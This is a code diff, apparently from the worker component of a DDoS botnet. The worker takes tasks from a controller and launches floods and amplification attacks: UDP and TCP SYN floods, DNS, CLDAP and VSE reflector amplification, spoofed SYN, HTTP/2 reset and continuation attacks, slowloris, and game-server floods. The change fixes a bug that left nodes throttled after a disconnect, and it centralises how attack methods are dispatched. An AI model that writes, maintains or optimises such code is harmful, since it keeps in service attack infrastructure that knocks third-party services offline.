@@ -41,11 +41,11 @@ var ctrlHTTPClient = &http.Client{
 }
 
 type Worker struct {
-	id               string
-	assignedID       string
-	controller       string
-	httpPort         string
-	authToken        string
+	id         string
+	assignedID string
+	controller string
+	httpPort   string
+	authToken  string
 	// configMu 保护 assignedID/controller/authToken 的跨 goroutine 访问：
 	// 主循环写（register/handleReconfigure），stats 流/更新 goroutine 读。
 	// 避免 Go race detector 报数据竞争（撕裂读/陈旧值）。
@@ -718,7 +718,7 @@ func (w *Worker) Run(ctx context.Context) error {
 					inRecovery = false
 					recoveryTicker.Stop()
 					atomic.StoreInt32(&w.degraded, 0)
-					attack.SetGlobalRateLimiter(0, int64(w.maxBWMbps)*125000)
+					w.restoreBandwidthLimit()
 					log.Printf("[worker] controller reachable again after long disconnect, bandwidth at %d Mbps", w.maxBWMbps)
 				}
 
@@ -745,9 +745,15 @@ func (w *Worker) Run(ctx context.Context) error {
 						}
 					}
 				} else if inRecovery && atomic.LoadInt32(&w.degraded) == 0 {
-					// 未发生过降级（单次失败即恢复）：直接复位，不进入恢复阶梯
+					// 未发生过降级（单次失败即恢复，或无限速节点被应急限速）：
+					// 直接复位，不进入恢复阶梯。
+					// 必须复位限速——stopAllAttacks 的应急限速（0.1Mbps）在
+					// "无限速节点"（maxBWMbps=0，degraded 恒为 0）场景下没有
+					// 其他恢复路径，不复位会让节点在一次抖动后永久卡在
+					// 12.5KB/s（表现为"任务在跑但面板 PPS≈0"）。
 					inRecovery = false
 					recoveryTicker.Stop()
+					w.restoreBandwidthLimit()
 				}
 			}
 		case <-recoveryTicker.C:
@@ -848,8 +854,21 @@ func (w *Worker) stopAllAttacks() {
 		log.Printf("[worker] emergency stop: combo task %s", id)
 		s.Stop()
 	}
-	// 0.1 Mbps 应急限速，等待重连恢复
+	// 0.1 Mbps 应急限速，等待重连恢复。
+	// 恢复由 restoreBandwidthLimit 负责（断连结束/退出恢复阶梯时调用）——
+	// 任何新增的限速点都必须保证有对应复位路径，否则节点会永久卡在降级档。
 	attack.SetGlobalRateLimiter(0, 12500)
+}
+
+// restoreBandwidthLimit 复位全局限速到配置值：maxBWMbps>0 → 对应 B/s；
+// maxBWMbps<=0（默认不限速）→ 0（清空限速器）。
+// 用于撤销 stopAllAttacks 的应急限速与恢复阶梯中的降级档位。
+func (w *Worker) restoreBandwidthLimit() {
+	if w.maxBWMbps > 0 {
+		attack.SetGlobalRateLimiter(0, int64(w.maxBWMbps)*125000)
+	} else {
+		attack.SetGlobalRateLimiter(0, 0)
+	}
 }
 
 // reportActiveTasksComplete 更新/退出前把进行中任务的完成状态上报给
@@ -1243,72 +1262,32 @@ func (w *Worker) startTask(task *pb.AttackTask) {
 
 	log.Printf("[worker] starting task %s: %s targets=%d", task.TaskId, method, len(targets))
 
-	var session *attack.AttackSession
+	if method == "combo" {
+		w.startComboTask(task)
+		return
+	}
 
+	// 反射器类与 ARK 需在分派前注入池/配置（依赖本机部署环境）
 	switch method {
-	case "vse":
-		session = attack.StartVSEAttackEx(cfg)
 	case "vse_reflector":
 		w.fetchReflectorsFromPoolInto(&cfg.Targets, "vse")
-		session = attack.StartVSEAmplificationEx(cfg)
 	case "dns_reflector":
 		w.fetchDNSAmp()
 		w.fetchReflectorsFromPoolInto(&cfg.Targets, "dns")
-		session = attack.StartDNSAmplificationEx(cfg)
 	case "cldap_reflector":
 		w.fetchReflectorsFromPoolInto(&cfg.Targets, "cldap")
-		session = attack.StartCLDAPAmplificationEx(cfg)
-	case "udp_stdhex", "udp_plain", "udp_bypass", "udp_burst":
-		session = attack.StartUDPFloodEx(cfg)
-	case "tcp_syn", "tcp_ack", "tcp_connect", "tcp_tcpbypass":
-		session = attack.StartTCPFloodEx(cfg)
-	case "http_flood":
-		session = attack.StartHTTPFloodEx(cfg)
-	case "head_flood":
-		session = attack.StartHEADFloodEx(cfg)
-	case "range_flood":
-		session = attack.StartRangeFloodEx(cfg)
-	case "post_flood":
-		session = attack.StartPOSTFloodEx(cfg)
-	case "http2_flood":
-		session = attack.StartHTTP2FloodEx(cfg)
-	case "http2_reset":
-		session = attack.StartHTTP2ResetEx(cfg)
-	case "http2_continuation":
-		session = attack.StartHTTP2ContinuationEx(cfg)
-	case "http2_bomb":
-		session = attack.StartHTTP2BombEx(cfg)
-	case "h2_ping":
-		session = attack.StartH2PingEx(cfg)
-	case "tls_handshake":
-		session = attack.StartTLSHandshakeEx(cfg)
-	case "slowloris", "slow_post":
-		session = attack.StartSlowlorisEx(cfg)
-	case "ws_flood":
-		session = attack.StartWSFloodEx(cfg)
-	case "ws_slow":
-		session = attack.StartWSSlowEx(cfg)
-	case "https_bypass":
-		session = attack.StartHTTPSBypassEx(cfg)
-	case "minecraft_handshake", "minecraft_login":
-		session = attack.StartMinecraftAttackEx(cfg)
 	case "game_udp":
 		// ARK 智能攻击：支持伪造时预拉反射器池走反射放大；
 		// 不支持伪造时攻击引擎自动走直连两段式（绝不伪源打自己）
 		if strings.EqualFold(task.Game, "ark") && w.canSpoofIP.Load() {
 			w.fetchReflectorsFromPoolInto(&cfg.Targets, "vse")
 		}
-		session = attack.StartGameUDPSpamEx(cfg)
-	case "combo":
-		w.startComboTask(task)
-		return
-	default:
-		log.Printf("[worker] unknown method: %s", method)
-		return
 	}
 
+	// 统一分派（attack.StartMethod 为唯一方法清单来源，含 tcp_syn_spoof）
+	session := attack.StartMethod(cfg)
 	if session == nil {
-		log.Printf("[worker] task %s failed to start (method=%s)", task.TaskId, task.Method)
+		log.Printf("[worker] unknown method: %s", method)
 		return
 	}
 
